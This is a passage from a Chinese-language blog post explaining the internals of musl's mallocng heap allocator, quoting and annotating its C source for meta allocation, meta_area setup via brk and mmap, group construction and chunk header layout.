<p>如果 <code>avail_meta_count</code> 为 0 则获取空闲的 <code>meta</code> ，之后从空闲的 <code>meta</code> 中取出一个返回。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!ctx.avail_meta_count) &#123;...&#125;</span><br><span class="line">ctx.avail_meta_count--;</span><br><span class="line">m = ctx.avail_meta++;</span><br><span class="line">m-&gt;prev = m-&gt;next = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">return</span> m;</span><br></pre></td></tr></table></figure></div>

<p>下面介绍如何获取空闲的 <code>meta</code> 。<br>首先先解释一下用到的两个标志 <code>need_unprotect</code> 和 <code>need_guard</code> 的含义。</p>
<ul>
<li><code>need_unprotect</code> 指的是有一块内存，需要用来作为 <code>meta_area</code> 但现在它没有读写权限，因此需要调用 <code>mprotect</code> 给这块内存赋上读写权限。</li>
<li><code>need_guard</code> 指的是有一块有读写权限的内存，现在从这个内存中某个位置起划定为 <code>meta_area</code> ，但是为了确保 <code>meta_area</code> 的 <code>check</code> 字段不被溢出覆盖，需要将 <code>meta_area</code> 前的内存去掉读写权限。</li>
</ul>
<p>这里首先将 <code>need_unprotect</code> 置 1 。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> need_unprotect = <span class="number">1</span>;</span><br></pre></td></tr></table></figure></div>

<p>之后讨论没有空闲的 <code>meta_area</code> 且 brk 可以分配连续内存的情况：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!ctx.avail_meta_area_count &amp;&amp; ctx.brk != <span class="number">-1</span>) &#123;</span><br><span class="line">    <span class="type">uintptr_t</span> new = ctx.brk + pagesize;</span><br><span class="line">    <span class="type">int</span> need_guard = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (!ctx.brk) &#123;</span><br><span class="line">        need_guard = <span class="number">1</span>;</span><br><span class="line">        ctx.brk = brk(<span class="number">0</span>);</span><br><span class="line">        <span class="comment">// some ancient kernels returned _ebss</span></span><br><span class="line">        <span class="comment">// instead of next page as initial brk.</span></span><br><span class="line">        ctx.brk += -ctx.brk &amp; (pagesize - <span class="number">1</span>);</span><br><span class="line">        new = ctx.brk + <span class="number">2</span> * pagesize;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (brk(new) != new) &#123;</span><br><span class="line">        ctx.brk = <span class="number">-1</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (need_guard) mmap((<span class="type">void</span> *) ctx.brk, pagesize, PROT_NONE, MAP_ANON | MAP_PRIVATE | MAP_FIXED, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">        ctx.brk = new;</span><br><span class="line">        ctx.avail_meta_areas = (<span class="type">void</span> *) (new - pagesize);</span><br><span class="line">        ctx.avail_meta_area_count = pagesize &gt;&gt; <span class="number">12</span>;</span><br><span class="line">        need_unprotect = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>这里分两种情况：</p>
<ul>
<li>如果 brk 第一次调用，即 <code>ctx.brk</code> 为 0 ，则先调用 <code>brk(0)</code> 获取 heap 段基址，然后在页对齐的基础上再分配两个内存页的内存并且 <code>need_guard</code> 置 1 。如果分配内存连续（<code>brk(new) != new</code>）则由于 <code>need_guard</code> 置 1 需要将前一个内存页去掉读写权限。最后将 <code>need_unprotect</code> 置 0 。</li>
</ul>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/12/13/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_musl%E5%8F%8A%E7%9B%B8%E5%85%B3%E4%BE%8B%E9%A2%98/8d1d6ffa3744fc3a87b82af6264ab6fc.png"
                     
                ></p>
<ul>
<li>如果 brk 不是第一次调用，即 <code>ctx.brk</code> 不为 0 ，则直接 brk 出一块内存页即可。</li>
</ul>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/12/13/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_musl%E5%8F%8A%E7%9B%B8%E5%85%B3%E4%BE%8B%E9%A2%98/c2082092d3c7b025c92fff6b8534d0db.png"
                      alt="c2082092d3c7b025c92fff6b8534d0db"
                ></p>
<p>如果之后如果还是没有空闲的 <code>meta_area</code> 说明此时 brk 以及不能连续扩展内存，因此需要通过 mmap 申请内存作为空闲的 <code>meta_area</code> 。mmap 的内存大小通过 <code>meta_alloc_shift</code> 计算，并且每次 mmap 之后，下次 mmap 的内存数量翻倍。和 brk 一样，获得的内存中的第一块内存页不能使用，由于 mmap 的内存没有读写权限，因此需要将 <code>ctx.avail_meta_areas</code> 指向的内存页赋上可读写权限。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!ctx.avail_meta_area_count) &#123;</span><br><span class="line">    <span class="type">size_t</span> n = <span class="number">2UL</span> &lt;&lt; ctx.meta_alloc_shift;</span><br><span class="line">    p = mmap(<span class="number">0</span>, n * pagesize, PROT_NONE, MAP_PRIVATE | MAP_ANON, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (p == MAP_FAILED) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    ctx.avail_meta_areas = p + pagesize;</span><br><span class="line">    ctx.avail_meta_area_count = (n - <span class="number">1</span>) * (pagesize &gt;&gt; <span class="number">12</span>);</span><br><span class="line">    ctx.meta_alloc_shift++;</span><br><span class="line">&#125;</span><br><span class="line">p = ctx.avail_meta_areas;</span><br><span class="line"><span class="keyword">if</span> ((<span class="type">uintptr_t</span>) p &amp; (pagesize - <span class="number">1</span>)) need_unprotect = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span> (need_unprotect)</span><br><span class="line">    <span class="keyword">if</span> (mprotect(p, pagesize, PROT_READ | PROT_WRITE) &amp;&amp; errno != ENOSYS)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br></pre></td></tr></table></figure></div>

<p>最后就是从空闲的 <code>meta_area</code> 中获取一个 <code>meta_areas</code> 然后再从该 <code>meta_areas</code> 中获取空闲的 meta 。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">ctx.avail_meta_area_count--;</span><br><span class="line">ctx.avail_meta_areas = p + <span class="number">4096</span>;</span><br><span class="line"><span class="keyword">if</span> (ctx.meta_area_tail) &#123;</span><br><span class="line">    ctx.meta_area_tail-&gt;next = (<span class="type">void</span> *) p;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    ctx.meta_area_head = (<span class="type">void</span> *) p;</span><br><span class="line">&#125;</span><br><span class="line">ctx.meta_area_tail = (<span class="type">void</span> *) p;</span><br><span class="line">ctx.meta_area_tail-&gt;check = ctx.secret;</span><br><span class="line">ctx.avail_meta_count = ctx.meta_area_tail-&gt;nslots = (<span class="number">4096</span> - <span class="keyword">sizeof</span>(<span class="keyword">struct</span> meta_area)) / <span class="keyword">sizeof</span> *m;</span><br><span class="line">ctx.avail_meta = ctx.meta_area_tail-&gt;slots;</span><br></pre></td></tr></table></figure></div>

<p>现在已经可以确定 meta_area 和 meta 的在内存中的关系如下图所示（以 mmap 扩展 meta_area 为例）。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/12/13/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_musl%E5%8F%8A%E7%9B%B8%E5%85%B3%E4%BE%8B%E9%A2%98/image-20251209154316295.png"
                      alt="image-20251209154316295"
                ></p>
<h3 id="group"><a href="#group" class="headerlink" title="group"></a>group</h3><div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">group</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">meta</span>;</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> active_idx : <span class="number">5</span>;</span><br><span class="line">    <span class="type">char</span> pad[UNIT - <span class="keyword">sizeof</span>(<span class="keyword">struct</span> meta *) - <span class="number">1</span>];</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> storage[];</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>

<p>group中即保存有需要分配出去的chunk。</p>
<p><code>struct meta *meta</code>：所属的meta的地址<br><code>unsigned char active_idx:5</code>：5个比特，表示还有多少可用chunk<br><code>char pad[UNIT - sizeof(struct meta *) - 1]</code>：手动16字节对齐<br><code>unsigned char storage[]</code>：要分配出去的内存空间，chunk</p>
<h4 id="alloc-group"><a href="#alloc-group" class="headerlink" title="alloc_group"></a>alloc_group</h4><p>首先获取一个 meta ，然后根据经验以及当前内存状态计算出需要申请的 <code>group</code> 中 chunk 的数量。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">size_t</span> size = UNIT * size_classes[sc];</span><br><span class="line"><span class="type">int</span> i = <span class="number">0</span>, cnt;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> *p;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">m</span> =</span> alloc_meta();</span><br><span class="line"><span class="keyword">if</span> (!m) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="type">size_t</span> usage = ctx.usage_by_class[sc];</span><br><span class="line"><span class="type">size_t</span> pagesize = PGSZ;</span><br><span class="line"><span class="type">int</span> active_idx;</span><br><span class="line"><span class="keyword">if</span> (sc &lt; <span class="number">9</span>) &#123;</span><br><span class="line">    <span class="keyword">while</span> (i &lt; <span class="number">2</span> &amp;&amp; <span class="number">4</span> * small_cnt_tab[sc][i] &gt; usage)</span><br><span class="line">        i++;</span><br><span class="line">    cnt = small_cnt_tab[sc][i];</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">// lookup max number of slots fitting in power-of-two size</span></span><br><span class="line">    <span class="comment">// from a table, along with number of factors of two we</span></span><br><span class="line">    <span class="comment">// can divide out without a remainder or reaching 1.</span></span><br><span class="line">    cnt = med_cnt_tab[sc &amp; <span class="number">3</span>];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// reduce cnt to avoid excessive eagar allocation.</span></span><br><span class="line">    <span class="keyword">while</span> (!(cnt &amp; <span class="number">1</span>) &amp;&amp; <span class="number">4</span> * cnt &gt; usage)</span><br><span class="line">        cnt &gt;&gt;= <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// data structures don&#x27;t support groups whose slot offsets</span></span><br><span class="line">    <span class="comment">// in units don&#x27;t fit in 16 bits.</span></span><br><span class="line">    <span class="keyword">while</span> (size * cnt &gt;= <span class="number">65536</span> * UNIT)</span><br><span class="line">        cnt &gt;&gt;= <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// If we selected a count of 1 above but it&#x27;s not sufficient to use</span></span><br><span class="line"><span class="comment">// mmap, increase to 2. Then it might be; if not it will nest.</span></span><br><span class="line"><span class="keyword">if</span> (cnt == <span class="number">1</span> &amp;&amp; size * cnt + UNIT &lt;= pagesize / <span class="number">2</span>) cnt = <span class="number">2</span>;</span><br></pre></td></tr></table></figure></div>

<p>之后分两种情况。</p>
<p>如果所需内存大于页大小的一半则采用 mmap 的方式获取内存，期间也会对 group 中 chunk 的数量进行调整。注意 <code>active_idx</code> 的初值为 max⁡(0,min⁡(⌊0x2000−16size⌋−1,cnt−1))max(0,min(⌊size0x2000−16⌋−1,cnt−1)) 。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// All choices of size*cnt are &quot;just below&quot; a power of two, so anything</span></span><br><span class="line"><span class="comment">// larger than half the page size should be allocated as whole pages.</span></span><br><span class="line"><span class="keyword">if</span> (size * cnt + UNIT &gt; pagesize / <span class="number">2</span>) &#123;</span><br><span class="line">    <span class="comment">// check/update bounce counter to start/increase retention</span></span><br><span class="line">    <span class="comment">// of freed maps, and inhibit use of low-count, odd-size</span></span><br><span class="line">    <span class="comment">// small mappings and single-slot groups if activated.</span></span><br><span class="line">    <span class="type">int</span> nosmall = is_bouncing(sc);</span><br><span class="line">    account_bounce(sc);</span><br><span class="line">    step_seq();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// since the following count reduction opportunities have</span></span><br><span class="line">    <span class="comment">// an absolute memory usage cost, don&#x27;t overdo them. count</span></span><br><span class="line">    <span class="comment">// coarse usage as part of usage.</span></span><br><span class="line">    <span class="keyword">if</span> (!(sc &amp; <span class="number">1</span>) &amp;&amp; sc &lt; <span class="number">32</span>) usage += ctx.usage_by_class[sc + <span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// try to drop to a lower count if the one found above</span></span><br><span class="line">    <span class="comment">// increases usage by more than 25%. these reduced counts</span></span><br><span class="line">    <span class="comment">// roughly fill an integral number of pages, just not a</span></span><br><span class="line">    <span class="comment">// power of two, limiting amount of unusable space.</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="number">4</span> * cnt &gt; usage &amp;&amp; !nosmall) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="number">0</span>)</span><br><span class="line">            ;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> ((sc &amp; <span class="number">3</span>) == <span class="number">1</span> &amp;&amp; size * cnt &gt; <span class="number">8</span> * pagesize)</span><br><span class="line">            cnt = <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> ((sc &amp; <span class="number">3</span>) == <span class="number">2</span> &amp;&amp; size * cnt &gt; <span class="number">4</span> * pagesize)</span><br><span class="line">            cnt = <span class="number">3</span>;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> ((sc &amp; <span class="number">3</span>) == <span class="number">0</span> &amp;&amp; size * cnt &gt; <span class="number">8</span> * pagesize)</span><br><span class="line">            cnt = <span class="number">3</span>;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> ((sc &amp; <span class="number">3</span>) == <span class="number">0</span> &amp;&amp; size * cnt &gt; <span class="number">2</span> * pagesize)</span><br><span class="line">            cnt = <span class="number">5</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">size_t</span> needed = size * cnt + UNIT;</span><br><span class="line">    needed += -needed &amp; (pagesize - <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// produce an individually-mmapped allocation if usage is low,</span></span><br><span class="line">    <span class="comment">// bounce counter hasn&#x27;t triggered, and either it saves memory</span></span><br><span class="line">    <span class="comment">// or it avoids eagar slot allocation without wasting too much.</span></span><br><span class="line">    <span class="keyword">if</span> (!nosmall &amp;&amp; cnt &lt;= <span class="number">7</span>) &#123;</span><br><span class="line">        req += IB + UNIT;</span><br><span class="line">        req += -req &amp; (pagesize - <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">if</span> (req &lt; size + UNIT || (req &gt;= <span class="number">4</span> * pagesize &amp;&amp; <span class="number">2</span> * cnt &gt; usage)) &#123;</span><br><span class="line">            cnt = <span class="number">1</span>;</span><br><span class="line">            needed = req;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    p = mmap(<span class="number">0</span>, needed, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANON, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (p == MAP_FAILED) &#123;</span><br><span class="line">        free_meta(m);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    m-&gt;maplen = needed &gt;&gt; <span class="number">12</span>;</span><br><span class="line">    ctx.mmap_counter++;</span><br><span class="line">    active_idx = (<span class="number">4096</span> - UNIT) / size - <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> (active_idx &gt; cnt - <span class="number">1</span>) active_idx = cnt - <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> (active_idx &lt; <span class="number">0</span>) active_idx = <span class="number">0</span>;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure></div>

<p>如果所需内存不超过页大小的一半则在再申请一个所需大小的 chunk，然后在其中构造 <code>group</code> 。与正常申请不同的是这里直接调用 <code>alloc_slot</code> 获取 chunk 的下标，不过和正常申请实际是一样的。在申请的 chunk 的头部要打上标记（<code>p[-3] = (p[-3] &amp; 31) | (6 &lt;&lt; 5)</code>）。最后再将 <code>group</code> 中的每个 chunk 的 <code>p[-4]</code> 处置零。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="type">int</span> j = size_to_class(UNIT + cnt * size - IB);</span><br><span class="line">    <span class="type">int</span> idx = alloc_slot(j, UNIT + cnt * size - IB);</span><br><span class="line">    <span class="keyword">if</span> (idx &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        free_meta(m);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">g</span> =</span> ctx.active[j];</span><br><span class="line">    p = enframe(g, idx, UNIT * size_classes[j] - IB, ctx.mmap_counter);</span><br><span class="line">    m-&gt;maplen = <span class="number">0</span>;</span><br><span class="line">    p[<span class="number">-3</span>] = (p[<span class="number">-3</span>] &amp; <span class="number">31</span>) | (<span class="number">6</span> &lt;&lt; <span class="number">5</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt;= cnt; i++)</span><br><span class="line">        p[UNIT + i * size - <span class="number">4</span>] = <span class="number">0</span>;</span><br><span class="line">    active_idx = cnt - <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>最后更新 <code>meta</code> 和 <code>group</code> 的相关字段，从这里可以看到，有的 chunk 对应的 <code>freed_mask</code> 被置 1 ，这些 chunk 暂时参与不到内存分配中。最后将管理申请到的 <code>group</code> 的 <code>meta</code> 返回。 </p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">ctx.usage_by_class[sc] += cnt;</span><br><span class="line">m-&gt;avail_mask = (<span class="number">2u</span> &lt;&lt; active_idx) - <span class="number">1</span>;</span><br><span class="line">m-&gt;freed_mask = (<span class="number">2u</span> &lt;&lt; (cnt - <span class="number">1</span>)) - <span class="number">1</span> - m-&gt;avail_mask;</span><br><span class="line">m-&gt;mem = (<span class="type">void</span> *) p;</span><br><span class="line">m-&gt;mem-&gt;meta = m;</span><br><span class="line">m-&gt;mem-&gt;active_idx = active_idx;</span><br><span class="line">m-&gt;last_idx = cnt - <span class="number">1</span>;</span><br><span class="line">m-&gt;freeable = <span class="number">1</span>;</span><br><span class="line">m-&gt;sizeclass = sc;</span><br><span class="line"><span class="keyword">return</span> m;</span><br></pre></td></tr></table></figure></div>

<h3 id="chunk-1"><a href="#chunk-1" class="headerlink" title="chunk"></a>chunk</h3><p>musl heap 中的 chunk 没有具体定义，但是根据程序可以分析出 chunk 的结构：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">chunk</span> &#123;</span></span><br><span class="line">    <span class="type">uint32_t</span> offset_32;</span><br><span class="line">    <span class="type">uint8_t</span> use_32_offset;</span><br><span class="line">    <span class="type">uint8_t</span> inedx:<span class="number">5</span>;</span><br><span class="line">    <span class="type">uint8_t</span> flag:<span class="number">3</span>;</span><br><span class="line">    <span class="type">uint16_t</span> offset_16;</span><br><span class="line">    <span class="type">char</span> user_data[]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>由于一般 <code>offset_32</code> 不使用，因此 <code>chunk</code> 结构如下图所示。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/12/13/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_musl%E5%8F%8A%E7%9B%B8%E5%85%B3%E4%BE%8B%E9%A2%98/image-20251209154401399.png"
                      alt="image-20251209154401399"
                ></p>
<ul>
<li><code>offset_32</code> 和 <code>offset_16</code> 都表示 <code>chunk</code> 的 <code>user_data</code> 与所在 <code>group</code> 的 <code>storage</code> 之间的偏移除以 16 ，只不过一个用 32 比特存储一个用 16 比特存储。当申请的 <code>chunk</code> 为该 <code>chunk</code> 内部的一块空间则外部的 <code>chunk</code> 的 <code>offset</code> 为与内部 <code>chunk</code> 的偏移除以 16 。当 <code>chunk</code> 被 free 掉时 <code>offset</code> 被置 0 。</li>
<li><code>use_32_offset</code> 表示是否用 <code>offset_32</code> 存储偏移。</li>
<li><code>flag</code> 是 <code>chunk</code> 的标志位。当申请的 <code>chunk</code> 为该 <code>chunk</code> 内部的一块空间则外部的 <code>chunk</code> 的 <code>flag</code> 为 7 ， 当申请的 <code>chunk</code> 作为 <code>group</code> 时该 <code>chunk</code> 的 <code>flag</code> 为 6 。正常申请出的 chunk ，该值为 <code>reserved</code> ，其中 <code>reserved</code> 为 <code>user_data</code> 到 <code>chunk</code> 结束位置的距离减去用户申请的内存大小与 5 取 min 的结果。如果 <code>chunk</code> 被 free 掉则 <code>flag</code> 和 <code>index</code> 一并置为 0xFF 。</li>
<li><code>index</code> 表示该 <code>chunk</code> 在 <code>group</code> 中的下标。当申请的 <code>chunk</code> 为该 <code>chunk</code> 内部的一块空间则外部的 <code>chunk</code> 的 <code>index</code> 为 0 ，内部 <code>chunk</code> 的 <code>index</code> 为外部 <code>chunk</code> 在 <code>group</code> 中的下标。</li>
</ul>
<h4 id="get-slot-index"><a href="#get-slot-index" class="headerlink" title="get_slot_index"></a>get_slot_index</h4><p>获取 <code>chunk</code> 的 <code>index</code> 。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">int</span> <span class="title function_">get_slot_index</span><span class="params">(<span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span> *p)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> p[<span class="number">-3</span>] &amp; <span class="number">31</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h4 id="get-nominal-size"><a href="#get-nominal-size" class="headerlink" title="get_nominal_size"></a>get_nominal_size</h4><p>获取 <code>chunk</code> 中 <code>user_data</code> 的大小 ，具体原理见下面对 <code>enframe</code> 和 <code>set_size</code> 函数的分析。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">size_t</span> <span class="title function_">get_nominal_size</span><span class="params">(<span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span> *p, <span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span> *end)</span> &#123;</span><br><span class="line">    <span class="type">size_t</span> reserved = p[<span class="number">-3</span>] &gt;&gt; <span class="number">5</span>;</span><br><span class="line">    <span class="keyword">if</span> (reserved &gt;= <span class="number">5</span>) &#123;</span><br><span class="line">        assert(reserved == <span class="number">5</span>);</span><br><span class="line">        reserved = *(<span class="type">const</span> <span class="type">uint32_t</span> *) (end - <span class="number">4</span>);</span><br><span class="line">        assert(reserved &gt;= <span class="number">5</span>);</span><br><span class="line">        assert(!end[<span class="number">-5</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    assert(reserved &lt;= end - p);</span><br><span class="line">    assert(!*(end - reserved));</span><br><span class="line">    <span class="comment">// also check the slot&#x27;s overflow byte</span></span><br><span class="line">    assert(!*end);</span><br><span class="line">    <span class="keyword">return</span> end - reserved - p;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h4 id="get-meta"><a href="#get-meta" class="headerlink" title="get_meta"></a>get_meta</h4><p>首先获取 <code>chunk</code> 的 <code>offset</code> 和 <code>index</code> ，然后根据 <code>offset</code> 得到 <code>chunk</code> 对应 <code>group</code> 的地址，之后根据 <code>group</code> 获得 <code>meta</code> 。</p>
